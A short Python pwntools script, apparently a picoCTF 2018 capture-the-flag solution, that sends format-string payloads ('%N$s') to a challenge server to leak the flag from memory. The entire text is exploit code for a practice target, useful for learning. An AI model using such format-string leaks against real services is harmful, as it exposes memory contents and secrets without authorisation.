#!/usr/bin/env python

from pwn import *
context.log_level = 'critical'

host, port = '2018shell2.picoctf.com', 46960


for i in range(10):
    s = remote(host, port)
    s.recvuntil('> ')

    s.sendline('%' +str(i)+ '$s')

    response = s.recv()
    if ( 'picoCTF' in response ):
        print response
        

s.close()
